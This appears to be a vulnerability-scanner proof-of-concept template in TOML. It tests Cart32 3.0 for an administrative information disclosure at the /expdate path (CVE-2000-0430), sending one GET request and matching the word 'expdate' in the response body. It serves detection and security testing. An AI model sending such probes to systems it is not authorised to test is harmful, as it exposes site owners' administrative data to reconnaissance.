[info]
author = "AVE"
description = "验证 Cart32 3.0 是否存在 /expdate 敏感调试信息泄露漏洞"
id = "POC-AVE-2000-0353"
name = "Cart32 3.0 expdate Administrative Information Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0353"]
vuln_id = [
    "CVE-2000-0430",
    "AVE-2000-0353",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/expdate"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["expdate"]
